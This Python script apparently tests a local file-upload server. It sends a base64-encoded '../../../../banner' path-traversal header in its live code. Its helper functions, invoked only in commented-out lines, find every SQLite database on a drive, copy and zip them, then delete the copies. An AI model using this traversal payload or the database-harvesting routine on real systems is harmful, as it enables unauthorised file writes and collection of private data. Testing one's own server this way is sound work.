#! /usr/bin/python
# coding=UTF-8
# version:python3.x

import os
import sqlite3

import shutil
import _thread
import random
import uuid
import zipfile
import requests
import base64


def del_file(path):
    ls = os.listdir(path)
    for i in ls:
        c_path = os.path.join(path, i)
        if os.path.isdir(c_path):
            del_file(c_path)
        else:
            os.remove(c_path)
    os.remove(path)


def find_sqlite_file(path, dir):
    """查找指定文件下的sqlite数据库文件"""
    with open(dir + "/sqlite.index", "a+", encoding="utf-8") as f:
        for root, dirs, files in os.walk(path):
            for name in files:
                ff = os.path.join(root, name)
                try:
                    with open(ff, "rb") as temp:
                        prefix = ''.join(['%02x' % b for b in bytes(temp.read(10))])
                        if prefix.startswith("53514c6974652066"):
                            fs = ff.replace("\\", "/")
                            nf = str(uuid.uuid1())
                            print(fs, dir + "/" + nf)
                            f.write(fs + '==>' + nf + "\n")
                            _thread.start_new_thread(shutil.copy, (fs, dir + "/" + nf))
                            # 读写校验
                            # try:
                            #     conn = sqlite3.connect(ff)
                            #     cursor = conn.cursor()
                            #     cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                            #     if (len(cursor.fetchall()) > 0):
                            #
                            # except Exception as e:
                            #     print("Exception:", e)
                            # finally:
                            #     conn.close()
                except Exception as e:
                    print("Exception:", e)


def zip_dir(dirname, zipfilename):
    filelist = []
    f = zipfile.ZipFile(zipfilename, "w", zipfile.ZIP_DEFLATED)
    for root, dirs, files in os.walk(dirname):
        for name in files:
            ff = os.path.join(root, name)
            filelist.append(ff)
            arcname = ff[len(dirname):]
            f.write(ff, arcname)

    f.close()


if __name__ == '__main__':
    # dir = "c:/" + ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', 5))
    # os.mkdir(dir)
    # find_sqlite_file("c:/", dir)
    # zip_dir(dir,dir+".zip")
    # del_file(dir)
    # curl -F "upfile=@/Users/yugj/Documents/hell/test/classes.dex" http://localhost:8000

    # files = {"014.jpg": open(u"D:\\图片\\中国风\\014.jpg", "rb").read()
    #          ,"1353930166177.jpg": open(u"D:\\图片\\中国风\\1353930166177.jpg", "rb").read()}
    # res = requests.request("POST", "http://localhost:9090/upload", data=None, files=files)
    # print(res.status_code,"===>",res.text)


    proxies = {'http': 'http://127.0.0.1:8888'}
    head = {'Path':base64.b64encode('../../../../banner'.encode('utf-8'))}
    payload = {'path': '/banner'}
    files = {"server1.conf": open(u"c:\\server1.conf", "rb").read()}
    res = requests.request("POST", "http://localhost:9090/upload", proxies=proxies,headers=head, data=None, files=files)
    print(res.status_code, "===>", res.text)
